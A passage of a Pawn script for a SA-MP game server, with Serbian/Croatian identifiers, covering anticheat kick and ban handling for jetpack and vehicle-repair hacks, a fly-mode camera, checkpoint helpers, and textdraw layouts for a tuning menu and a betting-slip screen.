				        format( globalstring, sizeof( globalstring ), "| V:AC | Moguc JetPack hack || %s[ID: %d] | Koristi /spec!!!", ImeIgraca( playerid ), playerid );
			   			AdminPoruka( ANTICHEAT, globalstring);

			   			SetPlayerSpecialAction( playerid, SPECIAL_ACTION_NONE );

				    }
				    case AC_KICK: {

						format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"JetPack hack", ImeIgraca( playerid ) );
						AdminPoruka( SVETLOCRVENA, globalstring );

						Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"JetPack hack");
				    }
				    case AC_BAN: {

						format( globalstring, sizeof( globalstring ), "| V:AC | %s je banovan sa servera. Razlog: "col_white"JetPack hack", ImeIgraca( playerid ) );
						AdminPoruka( SVETLOCRVENA, globalstring );

						CreateBanFile( playerid, "JetPack Hack", "AntiCheat" );

						Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"JetPack hack");
				    }
				}
			}
		}
		case DETECT_VEHREPAIR_HACK: {
		    if( antiCheatSS[ antiVehRepair ] == true ) {
		        switch( antiCheatSS[ VehRepRezimRada ] ) {
				    case AC_ADMINPORUKA: {
				        format( globalstring, sizeof( globalstring ), "| V:AC | Moguc Vehicle Repair hack || %s[ID: %d] | Koristi /spec!!!", ImeIgraca( playerid ), playerid );
			   			AdminPoruka( ANTICHEAT, globalstring );
				    }
				  //   case AC_KICK: {

				  //       format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Vehicle Repair hack", ImeIgraca( playerid ) );
						// AdminPoruka( SVETLOCRVENA, globalstring );

						// Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Vehicle Repair hack");

				  //   }
				  //   case AC_BAN: {

				  //       format( globalstring, sizeof( globalstring ), "| V:AC | %s je banovan sa servera. Razlog: "col_white"Vehicle Repair hack", ImeIgraca( playerid ) );
						// AdminPoruka( SVETLOCRVENA, globalstring );

						// CreateBanFile( playerid, "Vehicle Repair Hack", "AntiCheat" );

						// Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Vehicle Repair hack");

				  //   }
				}
			}
		}
    }
	return 1;
}
//------------------------------------------------------------------------------
#define GetVehicleNameEx(%0)      						   ImeVozila[(%0) - 400]
getVehicleName( vehicle ) {
	new vehName[ 20 ] = "A Hotring Racer";

    if( vehicle == -1 || vehicle == 0 ){
		format( vehName, sizeof( vehName ), "%s", "Nema Vozila" );
	}
	else if( vehicle != -1 ) {
		new vFile[ 50 ];
        format( vFile, sizeof( vFile ), V_FILE, vehicle );
        if( fexist( vFile ) ) {
			format( vehName, sizeof( vehName ), "%s", GetVehicleNameEx( VehicleInfo[ vehicle ][ vModel ] ) );
		}
		else if( !fexist( vFile ) ) {
		    format( vehName, sizeof( vehName ), "%s", "Nema Vozila" );
		}
	}

	return vehName;
}
//------------------------------------------------------------------------------
stock GetMoveDirectionFromKeys( ud, lr ) {
	new direction = 0;

    if(lr < 0)
	{
		if(ud < 0) 		direction = MOVE_FORWARD_LEFT;
		else if(ud > 0) direction = MOVE_BACK_LEFT;
		else            direction = MOVE_LEFT;
	}
	else if(lr > 0)
	{
		if(ud < 0)      direction = MOVE_FORWARD_RIGHT;
		else if(ud > 0) direction = MOVE_BACK_RIGHT;
		else			direction = MOVE_RIGHT;
	}
	else if(ud < 0) 	direction = MOVE_FORWARD;
	else if(ud > 0) 	direction = MOVE_BACK;

	return direction;
}

stock MoveCamera( playerid ) {
	new Float:FV[ 3 ], Float:CP[ 3 ];
	GetPlayerCameraPos( playerid, CP[ 0 ], CP[ 1 ], CP[ 2 ] );
    GetPlayerCameraFrontVector( playerid, FV[ 0 ], FV[ 1 ], FV[ 2 ] );
	if( flymodecamera[ playerid ][ accelmul ] <= 1 ) flymodecamera[ playerid ][ accelmul ] += ACCEL_RATE;
	new Float:speed = MOVE_SPEED * flymodecamera[ playerid ][ accelmul ];
	new Float:Xa, Float:Ya, Float:Za;
	GetNextCameraPosition( flymodecamera[ playerid ][ mode ], CP, FV, Xa, Ya, Za );
	MovePlayerObject( playerid, flymodecamera[ playerid ][ flyobject ], Xa, Ya, Za, speed );
	flymodecamera[ playerid ][ lastmove ] = GetTickCount( );
	return 1;
}

stock GetNextCameraPosition(move_mode, Float:CP[ 3 ], Float:FV[ 3 ], &Float:Xa, &Float:Ya, &Float:Za) {
    #define OFFSET_X (FV[0]*6000.0)
	#define OFFSET_Y (FV[1]*6000.0)
	#define OFFSET_Z (FV[2]*6000.0)
	switch(move_mode)
	{
		case MOVE_FORWARD:
		{
			Xa = CP[0]+OFFSET_X;
			Ya = CP[1]+OFFSET_Y;
			Za = CP[2]+OFFSET_Z;
		}
		case MOVE_BACK:
		{
			Xa = CP[0]-OFFSET_X;
			Ya = CP[1]-OFFSET_Y;
			Za = CP[2]-OFFSET_Z;
		}
		case MOVE_LEFT:
		{
			Xa = CP[0]-OFFSET_Y;
			Ya = CP[1]+OFFSET_X;
			Za = CP[2];
		}
		case MOVE_RIGHT:
		{
			Xa = CP[0]+OFFSET_Y;
			Ya = CP[1]-OFFSET_X;
			Za = CP[2];
		}
		case MOVE_BACK_LEFT:
		{
			Xa = CP[0]+(-OFFSET_X - OFFSET_Y);
 			Ya = CP[1]+(-OFFSET_Y + OFFSET_X);
		 	Za = CP[2]-OFFSET_Z;
		}
		case MOVE_BACK_RIGHT:
		{
			Xa = CP[0]+(-OFFSET_X + OFFSET_Y);
 			Ya = CP[1]+(-OFFSET_Y - OFFSET_X);
		 	Za = CP[2]-OFFSET_Z;
		}
		case MOVE_FORWARD_LEFT:
		{
			Xa = CP[0]+(OFFSET_X  - OFFSET_Y);
			Ya = CP[1]+(OFFSET_Y  + OFFSET_X);
			Za = CP[2]+OFFSET_Z;
		}
		case MOVE_FORWARD_RIGHT:
		{
			Xa = CP[0]+(OFFSET_X  + OFFSET_Y);
			Ya = CP[1]+(OFFSET_Y  - OFFSET_X);
			Za = CP[2]+OFFSET_Z;
		}
	}
}
stock CancelFlyMode( playerid ) {
	FlyMode[ playerid ] = false;
	CancelEdit( playerid );
	TogglePlayerSpectating( playerid, false);
	DestroyPlayerObject( playerid, flymodecamera[ playerid ][ flyobject ] );
	flymodecamera[ playerid ][ cameramode ] = false;
	return 1;
}

forward FlyMode1( playerid );
public FlyMode1( playerid ) {
	FlyModeAh( playerid );
}

stock FlyModeAh( playerid ) {
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos( playerid, X, Y, Z );
	TogglePlayerSpectating( playerid, true );

	flymodecamera[ playerid ][ flyobject ] = CreatePlayerObject( playerid, 19300, X, Y, Z, 0.0, 0.0, 0.0 );
	AttachCameraToPlayerObject( playerid, flymodecamera[ playerid ][ flyobject ] );
	FlyMode[ playerid ] = true;
	flymodecamera[ playerid ][ cameramode ] = true;
	return 1;
}
//------------------------------------------------------------------------------
forward RemoveBadge( playerid );
public RemoveBadge( playerid ) {
    RemovePlayerAttachedObject( playerid, OBJECT_SLOT_BADGE );
}
//------------------------------------------------------------------------------
stock PreloadAnimations(playerid)
{
	for (new i = 0; i < sizeof(g_aPreloadLibs); i ++) {
	    ApplyAnimation(playerid, g_aPreloadLibs[ i ], "null", 4.0, 0, 0, 0, 0, 0, 1);
	}
	return 1;
}
//------------------------------------------------------------------------------
stock Novi_SetPlayerCheckpoint( playerid, Float:x, Float:y, Float:z, Float:size ) {
    if( PlayerCPShow[ playerid ] == true ) {
        Novi_DisablePlayerCheckpoint( playerid );
        PlayerCPShow[ playerid ] = false;
	}
	PlayerCPShow[ playerid ] = true;
	SetPlayerCheckpoint( playerid, x, y, z, size);

    checkpointCheck[playerid] = true;

    // if(PlayerRoute[playerid][calculating]) { //ovo ce provjeravti dali je ruta kreirana
    //     //SendClientMessage(playerid,-1,"Prvo obrisite vasu izabranu rutu. /gpsoff");
    //     return 1;
    // }
    // if(PlayerRoute[playerid][Destination] != -1) { //ovo ce biti sigurnosna provjera da ne kreira igracu 2 rute prvo da iskljuci staru
    //     DisableGPS(playerid);
    // }
    // new PlayerClosest = NearestPlayerNode(playerid); //ovo ce uzeti najblizu tacku gdje se igrac nalazi
    // new TempDestination = NearestNodeFromPoint(x, y, z); //ovo se uzeti najblizu tacku na odredjenim kordinatama X,Y,Z
    
    // if(PlayerClosest == TempDestination) { //ako se igrac vec nalazi na odredistu
    //         //SCM(playerid,-1,"Nalazite se vec na tom odredistu.");
    //         return 1;
    // }
    // if(PlayerClosest == -1) { //ukoliko je igrac daleko od najblize tacke na putu
    //     //SendClientMessage(playerid,-1,"Satelit ne moze da vas pronadje na ovoj lokacij, izadjite na najblizu cestu.");
    //     return 1;
    // }
    // if(TempDestination == -1) { //ukoliko je odrediste X,Y,Z daleko od najblize tacke na putu
    //     //SendClientMessage(playerid,-1,"Satelit ne moze da pronadje odrediste, molimo pokusajte ponovo.");
    //     return 1;
    // }
    // if(CalculatePath(PlayerClosest,TempDestination,playerid, .GrabNodePositions = true)) { //ukoliko se ruta kreira
    //     PlayerRoute[playerid][calculating] = true;
    //     //SendClientMessage(playerid,-1,"Kreiranje rute, molimo sacekajte.");
    // }
    return 1;
}

stock Novi_DisablePlayerCheckpoint( playerid ) {
	if( PlayerCPShow[ playerid ] == true ) {

	    DisablePlayerCheckpoint( playerid );
		PlayerCPShow[ playerid ] = false;

        // if(PlayerRoute[playerid][Destination] != -1) {
        //     DisableGPS(playerid);
        // }
    }
}
//------------------------------------------------------------------------------
SetSexSkin( playerid ) {

    new sexskin;

	if( PlayerInfo[ playerid ][ xPol ] == 1 ) { sexskin = MuskiSkinoviID[0][0]; }
	else if( PlayerInfo[ playerid ][ xPol ] == 2 ) { sexskin = ZenskiSkinoviID[0][0]; }
	else { sexskin = MuskiSkinoviID[0][0]; }

	return sexskin;
}
//------------------------------------------------------------------------------
SetRandomSpawn() {

    new randomspawn;

	randomspawn = SPAWN_OBICAN_LS_1;
	
	return randomspawn;
}
//------------------------------------------------------------------------------
stock right(source[], len) {
	new retval[255], srclen;
	srclen = strlen(source);
	strmid(retval, source, srclen - len, srclen, 255);
	return retval;
}
//------------------------------------------------------------------------------
stock DMZPoruka( color, string[] ) {
	foreach( Player, i ) {
		if( NaDmEventu[ i ] == true ) {
			SCM( i, color, string ); } }
}
//------------------------------------------------------------------------------

//==============================================================================
ResetTuningInfo( playerid ) {
	TPInfo[ playerid ][ tID ] = -1;
	TPInfo[ playerid ][ tType ] = -1;
	TPInfo[ playerid ][ tPaintjob ] = false;
	TPInfo[ playerid ][ PJColor ] = -1;
	TPInfo[ playerid ][ PJColor ] = -1;
}
//------------------------------------------------------------------------------

stock TuningTDControl( playerid, bool:show ) {

	if( show == true ) {
	
        TuningBuy[ playerid ][ 0 ] = CreatePlayerTextDraw(playerid, 425.125000, 338.666687, "usebox");
		PlayerTextDrawLetterSize(playerid, TuningBuy[ playerid ][ 0 ], 0.000000, 8.627778);
		PlayerTextDrawTextSize(playerid, TuningBuy[ playerid ][ 0 ], 216.125000, 0.000000);
		PlayerTextDrawAlignment(playerid, TuningBuy[ playerid ][ 0 ], 1);
		PlayerTextDrawColor(playerid, TuningBuy[ playerid ][ 0 ], 0);
		PlayerTextDrawUseBox(playerid, TuningBuy[ playerid ][ 0 ], true);
		PlayerTextDrawBoxColor(playerid, TuningBuy[ playerid ][ 0 ], 102);
		PlayerTextDrawSetShadow(playerid, TuningBuy[ playerid ][ 0 ], 0);
		PlayerTextDrawSetOutline(playerid, TuningBuy[ playerid ][ 0 ], 0);
		PlayerTextDrawFont(playerid, TuningBuy[ playerid ][ 0 ], 0);

		TuningBuy[ playerid ][ 1 ] = CreatePlayerTextDraw(playerid, 319.375000, 337.749847, "Hydraulics");
		PlayerTextDrawLetterSize(playerid, TuningBuy[ playerid ][ 1 ], 0.386249, 1.156664);
		PlayerTextDrawAlignment(playerid, TuningBuy[ playerid ][ 1 ], 2);
		PlayerTextDrawColor(playerid, TuningBuy[ playerid ][ 1 ], -1);
		PlayerTextDrawSetShadow(playerid, TuningBuy[ playerid ][ 1 ], 0);
		PlayerTextDrawSetOutline(playerid, TuningBuy[ playerid ][ 1 ], 1);
		PlayerTextDrawBackgroundColor(playerid, TuningBuy[ playerid ][ 1 ], 51 );
		PlayerTextDrawFont(playerid, TuningBuy[ playerid ][ 1 ], 2);
		PlayerTextDrawSetProportional(playerid, TuningBuy[ playerid ][ 1 ], 1 );
		PlayerTextDrawSetSelectable(playerid, TuningBuy[ playerid ][ 1 ], false );

		TuningBuy[ playerid ][ 2 ] = CreatePlayerTextDraw(playerid, 198.375000, 361.583282, "-");
		PlayerTextDrawLetterSize(playerid, TuningBuy[ playerid ][ 2 ], 18.981874, 0.514999);
		PlayerTextDrawAlignment(playerid, TuningBuy[ playerid ][ 2 ], 1);
		PlayerTextDrawColor(playerid, TuningBuy[ playerid ][ 2 ], SRVBOJA1 );
		PlayerTextDrawSetShadow(playerid, TuningBuy[ playerid ][ 2 ], 0);
		PlayerTextDrawSetOutline(playerid, TuningBuy[ playerid ][ 2 ], 1);
		PlayerTextDrawBackgroundColor(playerid, TuningBuy[ playerid ][ 2 ], 51);
		PlayerTextDrawFont(playerid, TuningBuy[ playerid ][ 2 ], 2);
		PlayerTextDrawSetProportional(playerid, TuningBuy[ playerid ][ 2 ], 1);

		TuningBuy[ playerid ][ 3 ] = CreatePlayerTextDraw(playerid, 222.500000, 352.916656, "Left `Chrome Flames` Sideskirt");
		PlayerTextDrawLetterSize(playerid, TuningBuy[ playerid ][ 3 ], 0.244999, 1.092499);
		PlayerTextDrawAlignment(playerid, TuningBuy[ playerid ][ 3 ], 1);
		PlayerTextDrawColor(playerid, TuningBuy[ playerid ][ 3 ], -1);
		PlayerTextDrawSetShadow(playerid, TuningBuy[ playerid ][ 3 ], 0);
		PlayerTextDrawSetOutline(playerid, TuningBuy[ playerid ][ 3 ], 1);
		PlayerTextDrawBackgroundColor(playerid, TuningBuy[ playerid ][ 3 ], 51);
		PlayerTextDrawFont(playerid, TuningBuy[ playerid ][ 3 ], 2);
		PlayerTextDrawSetProportional(playerid, TuningBuy[ playerid ][ 3 ], 1);

		TuningBuy[ playerid ][ 4 ] = CreatePlayerTextDraw(playerid, 222.500000, 365.000000, "Sultan");
		PlayerTextDrawLetterSize(playerid, TuningBuy[ playerid ][ 4 ], 0.244999, 1.092499);
		PlayerTextDrawAlignment(playerid, TuningBuy[ playerid ][ 4 ], 1);
		PlayerTextDrawColor(playerid, TuningBuy[ playerid ][ 4 ], -1);
		PlayerTextDrawSetShadow(playerid, TuningBuy[ playerid ][ 4 ], 0);
		PlayerTextDrawSetOutline(playerid, TuningBuy[ playerid ][ 4 ], 1);
		PlayerTextDrawBackgroundColor(playerid, TuningBuy[ playerid ][ 4 ], 51);
		PlayerTextDrawFont(playerid, TuningBuy[ playerid ][ 4 ], 2);
		PlayerTextDrawSetProportional(playerid, TuningBuy[ playerid ][ 4 ], 1);

		TuningBuy[ playerid ][ 5 ] = CreatePlayerTextDraw(playerid, 215.125000, 372.999877, "-");
		PlayerTextDrawLetterSize(playerid, TuningBuy[ playerid ][ 5 ], 6.743125, 0.444999);
		PlayerTextDrawAlignment(playerid, TuningBuy[ playerid ][ 5 ], 1);
		PlayerTextDrawColor(playerid, TuningBuy[ playerid ][ 5 ], SRVBOJA1 );
		PlayerTextDrawSetShadow(playerid, TuningBuy[ playerid ][ 5 ], 0);
		PlayerTextDrawSetOutline(playerid, TuningBuy[ playerid ][ 5 ], 1);
		PlayerTextDrawBackgroundColor(playerid, TuningBuy[ playerid ][ 5 ], 51);
		PlayerTextDrawFont(playerid, TuningBuy[ playerid ][ 5 ], 2);
		PlayerTextDrawSetProportional(playerid, TuningBuy[ playerid ][ 5 ], 1);

		TuningBuy[ playerid ][ 6 ] = CreatePlayerTextDraw(playerid, 206.750000, 347.166564, "-");
		PlayerTextDrawLetterSize(playerid, TuningBuy[ playerid ][ 6 ], 18.981874, 0.514999);
		PlayerTextDrawAlignment(playerid, TuningBuy[ playerid ][ 6 ], 1);
		PlayerTextDrawColor(playerid, TuningBuy[ playerid ][ 6 ], SRVBOJA1 );
		PlayerTextDrawSetShadow(playerid, TuningBuy[ playerid ][ 6 ], 0);
		PlayerTextDrawSetOutline(playerid, TuningBuy[ playerid ][ 6 ], 1);
		PlayerTextDrawBackgroundColor(playerid, TuningBuy[ playerid ][ 6 ], 51);
		PlayerTextDrawFont(playerid, TuningBuy[ playerid ][ 6 ], 2);
		PlayerTextDrawSetProportional(playerid, TuningBuy[ playerid ][ 6 ], 1);

		TuningBuy[ playerid ][ 7 ] = CreatePlayerTextDraw(playerid, 385.000000, 381.500000, "ld_beat:right");
		PlayerTextDrawLetterSize(playerid, TuningBuy[ playerid ][ 7 ], 0.449999, 1.600000);
		PlayerTextDrawTextSize(playerid, TuningBuy[ playerid ][ 7 ], 27.500000, 13.416657);
		PlayerTextDrawAlignment(playerid, TuningBuy[ playerid ][ 7 ], 2);
		PlayerTextDrawColor(playerid, TuningBuy[ playerid ][ 7 ], -1);
		PlayerTextDrawUseBox(playerid, TuningBuy[ playerid ][ 7 ], true);
		PlayerTextDrawBoxColor(playerid, TuningBuy[ playerid ][ 7 ], 255);
		PlayerTextDrawSetShadow(playerid, TuningBuy[ playerid ][ 7 ], 0);
		PlayerTextDrawSetOutline(playerid, TuningBuy[ playerid ][ 7 ], 1);
		PlayerTextDrawBackgroundColor(playerid, TuningBuy[ playerid ][ 7 ], 51);
		PlayerTextDrawFont(playerid, TuningBuy[ playerid ][ 7 ], 4);
		PlayerTextDrawSetProportional(playerid, TuningBuy[ playerid ][ 7 ], 1);
		PlayerTextDrawSetSelectable(playerid, TuningBuy[ playerid ][ 7 ], true);

		TuningBuy[ playerid ][ 8 ] = CreatePlayerTextDraw(playerid, 230.375000, 381.916473, "ld_beat:left");
		PlayerTextDrawLetterSize(playerid, TuningBuy[ playerid ][ 8 ], 0.449999, 1.600000);
		PlayerTextDrawTextSize(playerid, TuningBuy[ playerid ][ 8 ], 27.500000, 13.416657);
		PlayerTextDrawAlignment(playerid, TuningBuy[ playerid ][ 8 ], 2);
		PlayerTextDrawColor(playerid, TuningBuy[ playerid ][ 8 ], -1);
		PlayerTextDrawUseBox(playerid, TuningBuy[ playerid ][ 8 ], true);
		PlayerTextDrawBoxColor(playerid, TuningBuy[ playerid ][ 8 ], 255);
		PlayerTextDrawSetShadow(playerid, TuningBuy[ playerid ][ 8 ], 0);
		PlayerTextDrawSetOutline(playerid, TuningBuy[ playerid ][ 8 ], 1);
		PlayerTextDrawBackgroundColor(playerid, TuningBuy[ playerid ][ 8 ], 51);
		PlayerTextDrawFont(playerid, TuningBuy[ playerid ][ 8 ], 4);
		PlayerTextDrawSetProportional(playerid, TuningBuy[ playerid ][ 8 ], 1);
		PlayerTextDrawSetSelectable(playerid, TuningBuy[ playerid ][ 8 ], true);

		TuningBuy[ playerid ][ 9 ] = CreatePlayerTextDraw(playerid, 320.000000, 381.499938, "POSTAVI");
		PlayerTextDrawTextSize(playerid, TuningBuy[ playerid ][ 9 ], 23.000000, 13.000000 );
		PlayerTextDrawLetterSize(playerid, TuningBuy[ playerid ][ 9 ], 0.421249, 1.360832 );
		PlayerTextDrawAlignment(playerid, TuningBuy[ playerid ][ 9 ], 2);
		PlayerTextDrawColor(playerid, TuningBuy[ playerid ][ 9 ], -1);
		PlayerTextDrawSetShadow(playerid, TuningBuy[ playerid ][ 9 ], 0);
		PlayerTextDrawSetOutline(playerid, TuningBuy[ playerid ][ 9 ], 1);
		PlayerTextDrawBackgroundColor(playerid, TuningBuy[ playerid ][ 9 ], 51);
		PlayerTextDrawFont(playerid, TuningBuy[ playerid ][ 9 ], 2);
		PlayerTextDrawSetProportional(playerid, TuningBuy[ playerid ][ 9 ], 1);
		PlayerTextDrawSetSelectable(playerid, TuningBuy[ playerid ][ 9 ], true);

		TuningBuy[ playerid ][ 10 ] = CreatePlayerTextDraw(playerid, 200.000000, 396.416656, "-");
		PlayerTextDrawLetterSize(playerid, TuningBuy[ playerid ][ 10 ], 18.981874, 0.514999);
		PlayerTextDrawAlignment(playerid, TuningBuy[ playerid ][ 10 ], 1);
		PlayerTextDrawColor(playerid, TuningBuy[ playerid ][ 10 ], SRVBOJA1 );
		PlayerTextDrawSetShadow(playerid, TuningBuy[ playerid ][ 10 ], 0);
		PlayerTextDrawSetOutline(playerid, TuningBuy[ playerid ][ 10 ], 1);
		PlayerTextDrawBackgroundColor(playerid, TuningBuy[ playerid ][ 10 ], 51);
		PlayerTextDrawFont(playerid, TuningBuy[ playerid ][ 10 ], 2);
		PlayerTextDrawSetProportional(playerid, TuningBuy[ playerid ][ 10 ], 1);
        																					 
		TuningBuy[ playerid ][ 11 ] = CreatePlayerTextDraw(playerid, 225.000000, 401.916595, "Napredni VIP tuning sys by ~r~V01D");
		PlayerTextDrawLetterSize(playerid, TuningBuy[ playerid ][ 11 ], 0.258749, 0.987497);
		PlayerTextDrawAlignment(playerid, TuningBuy[ playerid ][ 11 ], 1);
		PlayerTextDrawColor(playerid, TuningBuy[ playerid ][ 11 ], -1);
		PlayerTextDrawSetShadow(playerid, TuningBuy[ playerid ][ 11 ], 0);
		PlayerTextDrawSetOutline(playerid, TuningBuy[ playerid ][ 11 ], 1);
		PlayerTextDrawBackgroundColor(playerid, TuningBuy[ playerid ][ 11 ], 51);
		PlayerTextDrawFont(playerid, TuningBuy[ playerid ][ 11 ], 2);
		PlayerTextDrawSetProportional(playerid, TuningBuy[ playerid ][ 11 ], 1);

		TuningBuy[ playerid ][ 12 ] = CreatePlayerTextDraw(playerid, 203.500000, 411.416839, "-");
		PlayerTextDrawLetterSize(playerid, TuningBuy[ playerid ][ 12 ], 18.981874, 0.514998);
		PlayerTextDrawAlignment(playerid, TuningBuy[ playerid ][ 12 ], 1);
		PlayerTextDrawColor(playerid, TuningBuy[ playerid ][ 12 ], SRVBOJA1 );
		PlayerTextDrawSetShadow(playerid, TuningBuy[ playerid ][ 12 ], 0);
		PlayerTextDrawSetOutline(playerid, TuningBuy[ playerid ][ 12 ], 1);
		PlayerTextDrawBackgroundColor(playerid, TuningBuy[ playerid ][ 12 ], 51);
		PlayerTextDrawFont(playerid, TuningBuy[ playerid ][ 12 ], 2);
		PlayerTextDrawSetProportional(playerid, TuningBuy[ playerid ][ 12 ], 1);

		TuningBuy[ playerid ][ 13 ] = CreatePlayerTextDraw(playerid, 404.500000, 337.999877, "ld_beat:cross");
		PlayerTextDrawLetterSize(playerid, TuningBuy[ playerid ][ 13 ], 0.449999, 1.600000);
		PlayerTextDrawTextSize(playerid, TuningBuy[ playerid ][ 13 ], 17.500000, 8.749991);
		PlayerTextDrawAlignment(playerid, TuningBuy[ playerid ][ 13 ], 2);
		PlayerTextDrawColor(playerid, TuningBuy[ playerid ][ 13 ], -1);
		PlayerTextDrawUseBox(playerid, TuningBuy[ playerid ][ 13 ], true);
		PlayerTextDrawBoxColor(playerid, TuningBuy[ playerid ][ 13 ], 255);
		PlayerTextDrawSetShadow(playerid, TuningBuy[ playerid ][ 13 ], 0);
		PlayerTextDrawSetOutline(playerid, TuningBuy[ playerid ][ 13 ], 1);
		PlayerTextDrawBackgroundColor(playerid, TuningBuy[ playerid ][ 13 ], 51);
		PlayerTextDrawFont(playerid, TuningBuy[ playerid ][ 13 ], 4);
		PlayerTextDrawSetProportional(playerid, TuningBuy[ playerid ][ 13 ], 1);
		PlayerTextDrawSetSelectable(playerid, TuningBuy[ playerid ][ 13 ], true);
	
	}
	else if( show == false ) {
		for( new i = 0; i < 14; i ++) {
			PlayerTextDrawDestroy( playerid, TuningBuy[ playerid ][ i ] );
			TuningBuy[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
	}
}

stock KladionicaListicTDControl( playerid, bool:show ) {

	if( show == true ) {

		KladionicaSM[ playerid ][ 0 ] = CreatePlayerTextDraw(playerid, 525.125000, 143.250000, "usebox");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 0 ], 0.000000, 19.127779);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 0 ], 108.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 0 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 0 ], 0);
		PlayerTextDrawUseBox(playerid, KladionicaSM[ playerid ][ 0 ], true);
		PlayerTextDrawBoxColor(playerid, KladionicaSM[ playerid ][ 0 ], 102);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 0 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 0 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 0 ], 0);

		KladionicaSM[ playerid ][ 1 ] = CreatePlayerTextDraw(playerid, 115.625000, 172.083236, "Pocetak tekme");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 1 ], 0.271249, 0.969998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 1 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 1 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 1 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 1 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 1 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 1 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 1 ], 1);

		KladionicaSM[ playerid ][ 2 ] = CreatePlayerTextDraw(playerid, 110.000000, 186.083328, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 2 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 2 ], 413.125000, -0.583323);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 2 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 2 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 2 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 2 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 2 ], 4);

		KladionicaSM[ playerid ][ 3 ] = CreatePlayerTextDraw(playerid, 110.375000, 167.833374, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 3 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 3 ], 412.500000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 3 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 3 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 3 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 3 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 3 ], 4);

		KladionicaSM[ playerid ][ 4 ] = CreatePlayerTextDraw(playerid, 266.125000, 186.750015, "Manchester United~n~Manchester United~n~Manchester United~n~Manchester United~n~Manchester United~n~Manchester United~n~Manches");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 4 ], 0.249374, 0.940831);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 4 ], 2);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 4 ], SRVBOJA1 );
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 4 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 4 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 4 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 4 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 4 ], 1);

		KladionicaSM[ playerid ][ 5 ] = CreatePlayerTextDraw(playerid, 114.500000, 187.500045, "29.09.2015 20:45~n~29.09.2015 20:45~n~29.09.2015 20:45~n~29.09.2015 20:45~n~29.09.2015 20:45~n~29.09.2015 20:45~n~29.09.2015 20");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 5 ], 0.249374, 0.940831);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 5 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 5 ], SRVBOJA1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 5 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 5 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 5 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 5 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 5 ], 1);

		KladionicaSM[ playerid ][ 6 ] = CreatePlayerTextDraw(playerid, 381.500000, 187.166671, "Manchester United~n~Manchester United~n~Manchester United~n~Manchester United~n~Manchester United~n~Manchester United~n~Manches");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 6 ], 0.249374, 0.940831);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 6 ], 2);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 6 ], SRVBOJA1 );
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 6 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 6 ], 1);
